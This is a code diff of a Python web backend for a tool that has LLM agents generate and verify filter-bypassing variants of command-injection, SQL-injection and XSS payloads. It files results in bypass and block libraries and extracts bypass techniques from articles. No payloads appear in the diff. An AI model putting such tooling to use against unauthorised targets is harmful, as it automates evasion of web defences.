-            )
-            connection.execute(
-                """
-                UPDATE iteration_pool_items
-                SET status = 'started', task_id = ?, started_at = ?
-                WHERE id = ?
-                """,
-                (task_id, timestamp, item_id),
-            )
-            connection.commit()
+            if item["agent"] == "encoding":
+                if payload["vulnerability"] not in {
+                    "command-injection",
+                    "sql-injection",
+                    "xss",
+                }:
+                    raise HTTPException(
+                        status_code=422,
+                        detail="The encoding iteration agent supports command injection, SQL injection, and XSS",
+                    )
+                config = semantic_model_config()
+                task_id = str(uuid.uuid4())
+                connection.execute(
+                    """
+                    INSERT INTO encoding_tasks (
+                        id, base_payload_id, status, provider, model,
+                        candidate_count, error_message, created_at, completed_at,
+                        direction_context_json
+                    ) VALUES (?, ?, 'queued', ?, ?, ?, NULL, ?, NULL, '{}')
+                    """,
+                    (
+                        task_id,
+                        payload["id"],
+                        config["provider"],
+                        config["model"],
+                        body.candidate_count,
+                        timestamp,
+                    ),
+                )
+                connection.execute(
+                    """
+                    UPDATE iteration_pool_items
+                    SET status = 'started', task_id = ?, started_at = ?
+                    WHERE id = ?
+                    """,
+                    (task_id, timestamp, item_id),
+                )
+                connection.commit()
+                background_task = run_encoding_generation
+                agent = "encoding"
+            else:
+                if payload["vulnerability"] not in SEMANTIC_PART_VULNERABILITIES:
+                    raise HTTPException(
+                        status_code=422,
+                        detail="This vulnerability is not supported by the semantic part engine",
+                    )
+                parsed, context = semantic_task_context(payload)
+                if len(context["available_directions"]) < body.candidate_count:
+                    raise HTTPException(
+                        status_code=409,
+                        detail=f"Only {len(context['available_directions'])} semantic directions remain",
+                    )
+                config = semantic_model_config()
+                task_id = str(uuid.uuid4())
+                rule_hints = [item["id"] for item in context["available_directions"]]
+                connection.execute(
+                    """
+                    INSERT INTO generation_tasks (
+                        id, base_payload_id, status, provider, model, rule_hints_json,
+                        error_message, created_at, completed_at, candidate_count,
+                        direction_context_json, base_parts_json, parser_confidence,
+                        parser_status, unsupported_reason
+                    ) VALUES (?, ?, 'queued', ?, ?, ?, NULL, ?, NULL, ?, ?, ?, ?, ?, ?)
+                    """,
+                    (
+                        task_id,
+                        payload["id"],
+                        config["provider"],
+                        config["model"],
+                        json.dumps(rule_hints, ensure_ascii=False),
+                        timestamp,
+                        body.candidate_count,
+                        json.dumps(context, ensure_ascii=False),
+                        json.dumps(parsed["parts"], ensure_ascii=False),
+                        parsed.get("confidence", 0),
+                        parsed.get("status", "supported"),
+                        parsed.get("unsupported_reason"),
+                    ),
+                )
+                connection.execute(
+                    """
+                    UPDATE iteration_pool_items
+                    SET status = 'started', task_id = ?, started_at = ?
+                    WHERE id = ?
+                    """,
+                    (task_id, timestamp, item_id),
+                )
+                connection.commit()
+                background_task = run_semantic_generation
+                agent = "semantic"
         except HTTPException:
             connection.rollback()
             raise
         finally:
             connection.close()
-    background_tasks.add_task(run_semantic_generation, task_id)
+    background_tasks.add_task(background_task, task_id)
     return {
         "id": task_id,
-        "agent": "semantic",
+        "agent": agent,
         "status": "queued",
         "candidate_count": body.candidate_count,
         "pool_item_id": item_id,
@@ -3030,3 +5067,468 @@ async def list_encoding_documents():
         except Exception:
             pass
     return documents
+
+
+@app.get("/api/verification-agent/documents")
+async def list_verification_documents():
+    """List verification agent documents."""
+    documents = []
+    for doc_id, (kind, title, path) in VERIFICATION_AGENT_DOCUMENTS.items():
+        try:
+            content = path.read_text(encoding="utf-8")
+            documents.append({"id": doc_id, "kind": kind, "title": title, "content": content})
+        except Exception:
+            pass
+    return documents
+
+
+@app.get("/api/verification-targets")
+async def list_verification_targets():
+    """List all registered verification target ranges (for the target page)."""
+    return verification_targets(str(CONFIG_PATH))
+
+
+# ---------------------------------------------------------------------------
+# 检验任务（verification_jobs）与 bypass/block 库
+# ---------------------------------------------------------------------------
+
+def _verification_job_view(source: sqlite3.Row | dict[str, Any]) -> dict[str, Any]:
+    item = dict(source)
+    item["raw_evidence"] = json_value(item.pop("raw_evidence_json", None), None)
+    item["verdict"] = json_value(item.pop("verdict_json", None), None)
+    return item
+
+
+def _library_entry_view(source: sqlite3.Row | dict[str, Any]) -> dict[str, Any]:
+    item = dict(source)
+    item["provenance"] = json_value(item.pop("provenance_json", None), {})
+    return item
+
+
+def _paged_library_response(
+    table: str,
+    filters: list[str],
+    params: tuple[Any, ...],
+    limit: int | None,
+    cursor: int,
+) -> list[dict[str, Any]] | dict[str, Any]:
+    sql = f"SELECT * FROM {table}"
+    if filters:
+        sql += " WHERE " + " AND ".join(filters)
+    sql += " ORDER BY created_at DESC"
+    if limit is None:
+        return [_library_entry_view(record) for record in db_rows(sql, params)]
+    page_size = min(limit, MAX_PAGE_SIZE)
+    total = db_row(f"SELECT COUNT(*) AS count FROM {table}" + (f" WHERE {' AND '.join(filters)}" if filters else ""), params)["count"]
+    records = db_rows(f"{sql} LIMIT ? OFFSET ?", (*params, page_size, cursor))
+    items = [_library_entry_view(record) for record in records]
+    next_cursor = cursor + len(items)
+    return {"items": items, "total": total, "next_cursor": next_cursor if next_cursor < total else None}
+
+
+@app.get("/api/bypass-library")
+def list_bypass_library(
+    vulnerability: str | None = Query(default=None),
+    limit: int | None = Query(default=None, ge=1, le=MAX_PAGE_SIZE),
+    cursor: int = Query(default=0, ge=0),
+):
+    filters: list[str] = []
+    params: list[Any] = []
+    if vulnerability:
+        filters.append("vulnerability = ?")
+        params.append(vulnerability)
+    return _paged_library_response("bypass_library", filters, tuple(params), limit, cursor)
+
+
+@app.get("/api/bypass-library/{entry_id}")
+async def get_bypass_library_entry(entry_id: str):
+    record = db_row("SELECT * FROM bypass_library WHERE id = ?", (entry_id,))
+    if not record:
+        raise HTTPException(status_code=404, detail="Bypass library entry not found")
+    return _library_entry_view(record)
+
+
+@app.get("/api/block-library")
+def list_block_library(
+    failure_stage: str | None = Query(default=None),
+    vulnerability: str | None = Query(default=None),
+    limit: int | None = Query(default=None, ge=1, le=MAX_PAGE_SIZE),
+    cursor: int = Query(default=0, ge=0),
+):
+    filters: list[str] = []
+    params: list[Any] = []
+    if failure_stage:
+        filters.append("failure_stage = ?")
+        params.append(failure_stage)
+    if vulnerability:
+        filters.append("vulnerability = ?")
+        params.append(vulnerability)
+    return _paged_library_response("block_library", filters, tuple(params), limit, cursor)
+
+
+@app.get("/api/block-library/{entry_id}")
+async def get_block_library_entry(entry_id: str):
+    record = db_row("SELECT * FROM block_library WHERE id = ?", (entry_id,))
+    if not record:
+        raise HTTPException(status_code=404, detail="Block library entry not found")
+    return _library_entry_view(record)
+
+
+@app.get("/api/unverified-library")
+def list_unverified_library(
+    vulnerability: str | None = Query(default=None),
+    limit: int | None = Query(default=None, ge=1, le=MAX_PAGE_SIZE),
+    cursor: int = Query(default=0, ge=0),
+):
+    filters: list[str] = []
+    params: list[Any] = []
+    if vulnerability:
+        filters.append("vulnerability = ?")
+        params.append(vulnerability)
+    return _paged_library_response("unverified_library", filters, tuple(params), limit, cursor)
+
+
+@app.get("/api/unverified-library/{entry_id}")
+async def get_unverified_library_entry(entry_id: str):
+    record = db_row("SELECT * FROM unverified_library WHERE id = ?", (entry_id,))
+    if not record:
+        raise HTTPException(status_code=404, detail="Unverified library entry not found")
+    return _library_entry_view(record)
+
+
+@app.post("/api/unverified-library/{entry_id}/resolve", status_code=200)
+async def resolve_unverified_library_entry(entry_id: str, payload: dict[str, Any]):
+    """人工复核：把 unverified 记录转为 bypass（confirmed）或 block（failed）。"""
+    outcome = payload.get("outcome")
+    if outcome not in {"confirmed", "failed"}:
+        raise HTTPException(status_code=422, detail="outcome must be 'confirmed' or 'failed'")
+    timestamp = utc_now()
+    with DB_LOCK:
+        connection = connect()
+        try:
+            record = connection.execute(
+                "SELECT * FROM unverified_library WHERE id = ?", (entry_id,)
+            ).fetchone()
+            if not record:
+                raise HTTPException(status_code=404, detail="Unverified library entry not found")
+            entry = dict(record)
+            agent = entry["source_agent"]
+            candidate_id = entry["source_candidate_id"]
+
+            if outcome == "confirmed":
+                verdict = {
+                    "bypass_verdict": "bypass",
+                    "execution_verdict": "confirmed",
+                    "failure_stage": None,
+                    "confidence": 1.0,
+                    "rationale": "人工复核确认成功",
+                }
+                labels = ["绕过成功", "验证成功"]
+                connection.execute(
+                    "DELETE FROM block_library WHERE source_agent = ? AND source_candidate_id = ?",
+                    (agent, candidate_id),
+                )
+                connection.execute(
+                    """
+                    INSERT INTO bypass_library (
+                        id, source_agent, source_candidate_id, candidate_kind, name,
+                        vulnerability, delivery, target_key, content, confidence, rationale,
+                        provenance_json, bypass_success, verification_success, labels_json,
+                        verification_job_id, created_at, updated_at
+                    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 1, 1, ?, ?, ?, ?)
+                    ON CONFLICT(source_agent, source_candidate_id) DO UPDATE SET
+                        bypass_success = 1, verification_success = 1,
+                        labels_json = excluded.labels_json,
+                        verification_job_id = excluded.verification_job_id,
+                        updated_at = excluded.updated_at
+                    """,
+                    (
+                        str(uuid.uuid4()), agent, candidate_id, entry["candidate_kind"],
+                        entry["name"], entry["vulnerability"], entry["delivery"],
+                        entry["target_key"], entry["content"], 1.0, "人工复核确认成功",
+                        entry["provenance_json"],
+                        json.dumps(labels, ensure_ascii=False),
+                        entry.get("verification_job_id"), timestamp, timestamp,
+                    ),
+                )
+            else:
+                labels = ["绕过成功", "验证失败"]
+                connection.execute(
+                    "DELETE FROM bypass_library WHERE source_agent = ? AND source_candidate_id = ?",
+                    (agent, candidate_id),
+                )
+                connection.execute(
+                    """
+                    INSERT INTO block_library (
+                        id, source_agent, source_candidate_id, candidate_kind, name,
+                        vulnerability, delivery, target_key, content, failure_stage, confidence,
+                        rationale, provenance_json, bypass_success, verification_success, labels_json,
+                        verification_job_id, created_at, updated_at
+                    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 'verify_failed', ?, ?, ?, 1, 0, ?, ?, ?, ?)
+                    ON CONFLICT(source_agent, source_candidate_id) DO UPDATE SET
+                        failure_stage = 'verify_failed',
+                        labels_json = excluded.labels_json,
+                        verification_job_id = excluded.verification_job_id,
+                        updated_at = excluded.updated_at
+                    """,
+                    (
+                        str(uuid.uuid4()), agent, candidate_id, entry["candidate_kind"],
+                        entry["name"], entry["vulnerability"], entry["delivery"],
+                        entry["target_key"], entry["content"], 1.0, "人工复核确认失败",
+                        entry["provenance_json"],
+                        json.dumps(labels, ensure_ascii=False),
+                        entry.get("verification_job_id"), timestamp, timestamp,
+                    ),
+                )
+
+            # 从 unverified 库删除
+            connection.execute("DELETE FROM unverified_library WHERE id = ?", (entry_id,))
+            # 更新 verification_jobs 的 verdict
+            if entry.get("verification_job_id"):
+                connection.execute(
+                    """
+                    UPDATE verification_jobs
+                    SET bypass_verdict = ?, execution_verdict = ?, failure_stage = ?,
+                        completed_at = ?
+                    WHERE id = ?
+                    """,
+                    (
+                        "bypass",
+                        "confirmed" if outcome == "confirmed" else "not_confirmed",
+                        None if outcome == "confirmed" else "verify_failed",
+                        timestamp,
+                        entry["verification_job_id"],
+                    ),
+                )
+            connection.commit()
+        finally:
+            connection.close()
+    return {"resolved": outcome}
+
+
+@app.get("/api/verification-jobs")
+def list_verification_jobs(
+    status: str | None = Query(default=None),
+    limit: int | None = Query(default=None, ge=1, le=MAX_PAGE_SIZE),
+    cursor: int = Query(default=0, ge=0),
+):
+    filters: list[str] = []
+    params: list[Any] = []
+    if status:
+        filters.append("status = ?")
+        params.append(status)
+    sql = "SELECT * FROM verification_jobs"
+    if filters:
+        sql += " WHERE " + " AND ".join(filters)
+    sql += " ORDER BY created_at DESC"
+    if limit is None:
+        return [_verification_job_view(record) for record in db_rows(sql, tuple(params))]
+    page_size = min(limit, MAX_PAGE_SIZE)
+    total = db_row(
+        "SELECT COUNT(*) AS count FROM verification_jobs" + (f" WHERE {' AND '.join(filters)}" if filters else ""),
+        tuple(params),
+    )["count"]
+    records = db_rows(f"{sql} LIMIT ? OFFSET ?", (*params, page_size, cursor))
+    items = [_verification_job_view(record) for record in records]
+    next_cursor = cursor + len(items)
+    return {"items": items, "total": total, "next_cursor": next_cursor if next_cursor < total else None}
+
+
+@app.get("/api/verification-jobs/{job_id}")
+async def get_verification_job(job_id: str):
+    record = db_row("SELECT * FROM verification_jobs WHERE id = ?", (job_id,))
+    if not record:
+        raise HTTPException(status_code=404, detail="Verification job not found")
+    return _verification_job_view(record)
+
+
+@app.post("/api/verification-jobs/{job_id}/reverify", status_code=202)
+async def reverify_verification_job(job_id: str):
+    record = db_row("SELECT * FROM verification_jobs WHERE id = ?", (job_id,))
+    if not record:
+        raise HTTPException(status_code=404, detail="Verification job not found")
+    with DB_LOCK:
+        connection = connect()
+        try:
+            connection.execute(
+                "UPDATE verification_jobs SET status = 'queued', error_message = NULL WHERE id = ?",
+                (job_id,),
+            )
+            connection.commit()
+        finally:
+            connection.close()
+    _start_verification_loop()
+    return {"id": job_id, "status": "queued"}
+
+
+# ---------------------------------------------------------------------------
+# 知识库管理（kb_techniques / 技巧分组 / 文章导入 / 转正）
+# ---------------------------------------------------------------------------
+
+def _kb_technique_view(source: sqlite3.Row | dict[str, Any]) -> dict[str, Any]:
+    item = dict(source)
+    item["group"] = technique_group(item.get("technique_id", ""))
+    item["labels"] = json_value(item.pop("labels_json", None), [])
+    return item
+
+
+@app.get("/api/kb-techniques")
+def list_kb_techniques(
+    group: str | None = Query(default=None),
+    vulnerability: str | None = Query(default=None),
+    status: str | None = Query(default=None),
+):
+    """列出知识库技巧，按 group（semantic/encoding）过滤。"""
+    records = db_rows("SELECT * FROM kb_techniques")
+    items = [_kb_technique_view(r) for r in records]
+    if group:
+        items = [it for it in items if it["group"] == group]
+    if vulnerability:
+        items = [it for it in items if it["vulnerability"] == vulnerability]
+    if status:
+        items = [it for it in items if it["status"] == status]
+    items.sort(key=lambda it: (it["group"], it["vulnerability"], it["technique_id"]))
+    return items
+
+
+@app.get("/api/kb-techniques/stats")
+def kb_techniques_stats():
+    """知识库统计：语义/编码两组的技巧数、已转正数。"""
+    records = db_rows("SELECT technique_id, status, vulnerability FROM kb_techniques")
+    stats = {"semantic": {"total": 0, "promoted": 0}, "encoding": {"total": 0, "promoted": 0}}
+    for r in records:
+        g = technique_group(r["technique_id"])
+        stats[g]["total"] += 1
+        if r["status"] == "promoted":
+            stats[g]["promoted"] += 1
+    return stats
+
+
+@app.post("/api/kb-techniques/import", status_code=201)
+async def import_kb_techniques(payload: dict[str, Any]):
+    """LLM 浓缩提取文章中的绕过技巧，写入 kb_techniques + knowledge_base/sources。"""
+    content = str(payload.get("content") or "").strip()
+    if not content:
+        raise HTTPException(status_code=422, detail="content is required")
+    source_name = str(payload.get("source_name") or "manual_article.md").strip()
+
+    # 1. LLM 浓缩提取技巧（同步）
+    techniques = _extract_techniques_via_llm(content)
+    if not techniques:
+        raise HTTPException(status_code=422, detail="LLM 未能从文章中提取到绕过技巧")
+
+    # 2. 存 sources 文件（原文）
+    kb_sources = PROJECT_ROOT / "data" / "knowledge_base" / "sources"
+    kb_sources.mkdir(parents=True, exist_ok=True)
+    safe_name = source_name.replace("/", "_").replace("\\", "_")
+    (kb_sources / safe_name).write_text(content, encoding="utf-8")
+
+    # 3. 落库
+    timestamp = utc_now()
+    inserted = 0
+    with DB_LOCK:
+        connection = connect()
+        try:
+            for tech in techniques:
+                technique_id = str(tech.get("technique_id") or "").strip()
+                name = str(tech.get("name") or "").strip()
+                vulnerability = str(tech.get("vulnerability") or "").strip()
+                principle = str(tech.get("principle") or "").strip()
+                template = str(tech.get("template") or "").strip()
+                if not technique_id or not name or not vulnerability:
+                    continue
+                if vulnerability not in VULNERABILITIES:
+                    continue
+                source_note = f"原理：{principle} 模板：{template}" if (principle or template) else ""
+                connection.execute(
+                    """
+                    INSERT INTO kb_techniques (
+                        id, technique_id, name, vulnerability, status, success_count,
+                        labels_json, source_note, created_at, updated_at
+                    ) VALUES (?, ?, ?, ?, 'pending', 0, '[]', ?, ?, ?)
+                    ON CONFLICT(technique_id) DO UPDATE SET
+                        name = excluded.name,
+                        vulnerability = excluded.vulnerability,
+                        source_note = excluded.source_note,
+                        updated_at = excluded.updated_at
+                    """,
+                    (
+                        str(uuid.uuid4()),
+                        technique_id,
+                        name,
+                        vulnerability,
+                        source_note,
+                        timestamp,
+                        timestamp,
+                    ),
+                )
+                inserted += 1
+            connection.commit()
+        finally:
+            connection.close()
+    return {"inserted": inserted, "parsed": len(techniques)}
+
+
+def _extract_techniques_via_llm(content: str) -> list[dict[str, Any]]:
+    """调用 LLM 浓缩提取文章中的绕过技巧。"""
+    config = _verify_llm_config()
+    if not _llm_config_complete(config):
+        # LLM 不可用，回退到正则解析
+        return parse_techniques(content)
+    messages = [
+        {"role": "system", "content": TECHNIQUE_EXTRACT_SYSTEM_PROMPT},
+        {"role": "user", "content": content},
+    ]
+    try:
+        response = _post_chat_completion(config, messages)
+        response.raise_for_status()
+    except Exception as error:  # noqa: BLE001
+        LOGGER.warning("technique extract LLM failed: %s", error)
+        return parse_techniques(content)
+    raw_message = response.json().get("choices", [{}])[0].get("message", {}).get("content", "")
+    decoded = _extract_json_payload(raw_message)
+    if isinstance(decoded, dict):
+        techniques = decoded.get("techniques")
+        if isinstance(techniques, list):
+            return [t for t in techniques if isinstance(t, dict)]
+    return parse_techniques(content)
+
+
+@app.post("/api/kb-techniques/prune", status_code=200)
+async def prune_kb_techniques():
+    """剪枝：把从未被关联、无成功记录的 pending 技巧标记为 pruned。"""
+    with DB_LOCK:
+        connection = connect()
+        try:
+            pruned = _prune_techniques(connection)
+            connection.commit()
+        finally:
+            connection.close()
+    return {"pruned": pruned}
+
+
+@app.get("/api/kb-techniques/prune-events")
+def list_kb_prune_events():
+    """列出剪枝事件。"""
+    return [_prune_event_view(r) for r in db_rows("SELECT * FROM kb_prune_events ORDER BY created_at DESC")]
+
+
+@app.get("/api/kb-agent-handovers")
+def kb_agent_handovers():
+    """语义/编码 agent 实际使用手法统计（rule_labels / 编码链频次）。"""
+    semantic_counts = db_rows(
+        "SELECT rule_labels_json FROM candidates WHERE rule_labels_json IS NOT NULL"
+    )
+    from collections import Counter
+    semantic_counter: Counter = Counter()
+    for r in semantic_counts:
+        for label in json_value(r["rule_labels_json"], []):
+            semantic_counter[label] += 1
+    encoding_counter: Counter = Counter()
+    for r in db_rows("SELECT encoding_chain_json FROM encoding_candidates WHERE encoding_chain_json IS NOT NULL"):
+        for step in json_value(r["encoding_chain_json"], []):
+            encoding_counter[step.get("type", "unknown")] += 1
+    return {
+        "semantic": [{"label": k, "count": v} for k, v in semantic_counter.most_common()],
+        "encoding": [{"label": k, "count": v} for k, v in encoding_counter.most_common()],
+    }
